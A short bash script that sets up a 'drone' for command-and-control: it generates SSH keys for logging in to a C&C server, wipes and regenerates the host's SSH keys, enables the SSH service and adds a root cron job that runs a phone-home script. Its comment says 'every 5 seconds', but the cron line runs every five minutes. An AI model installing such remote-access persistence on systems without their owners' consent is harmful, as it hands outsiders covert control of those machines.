#!/bin/bash

### SETUP DRONE ###


# Create directory where files will live if not already created
mkdir -p /opt/ssh-phone-home
cd /opt/ssh-phone-home

# Generate SSH keys for logging in to C&C
echo -e -n "/opt/ssh-phone-home/id_rsa\n\n\n" | ssh-keygen


## Setup the local SSH server for connections from C&C ##

# Delete original SSH host keys and generate new ones
rm /etc/ssh/ssh_host_*
dpkg-reconfigure openssh-server

# Enable SSH service to start at boot
update-rc.d ssh enable

# Start the SSH service now
service ssh start


## Create a cron job to phone home every 5 seconds ##
echo "*/5 *  * * *  root  /opt/ssh-phone-home/phone-home.sh" >> /etc/crontab

